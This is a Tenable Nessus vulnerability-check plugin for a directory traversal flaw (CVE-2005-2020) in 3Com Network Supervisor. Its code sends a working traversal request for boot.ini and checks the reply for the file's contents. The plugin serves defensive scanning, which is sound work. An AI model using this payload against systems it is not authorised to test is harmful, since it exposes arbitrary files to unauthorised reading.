#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(19939);
  script_version("$Revision: 1.17 $");
  script_cvs_date("$Date: 2015/09/24 20:59:26 $");

  script_cve_id("CVE-2005-2020");
  script_bugtraq_id(14715);
  script_osvdb_id(19152);

  script_name(english:"3Com Network Supervisor Traversal Arbitrary File Access");
  script_summary(english:"Checks for directory traversal vulnerability in 3Com Network Supervisor");

  script_set_attribute(attribute:"synopsis", value:"It is possible to retrieve arbitrary files on the remote host.");
  script_set_attribute(attribute:"description", value:
"The remote host is running 3Com Network Supervisor, a network
monitoring application. 

The version of 3Com Network Supervisor installed on the remote host is
prone to a directory traversal attack and, as such, allows an
unauthenticated attacker to read arbitrary files on the same filesystem
as the application.");
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?0bd2df4e");
  script_set_attribute(attribute:"solution", value:"Apply the appropriate Critical Update 1 from 3Com.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2005/09/02");
  script_set_attribute(attribute:"plugin_publication_date", value:"2005/10/06");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 21700);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:21700, embedded: 1);

# If the banner indicates it's 3Com's product...
banner = get_http_banner(port:port);
if (banner && "Server: 3NS Report Command Server" >< banner) {
  # Try to exploit the flaw to read 'boot.ini'.
  r = http_send_recv3(method: "GET",
    item:string("/..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\boot.ini"),
    port:port,
    exit_on_fail:TRUE
  );

  # There's a problem if it looks like the file.
  if ("[boot loader]" >< r[1]+r[2]) {
    security_hole(port);
  }
}
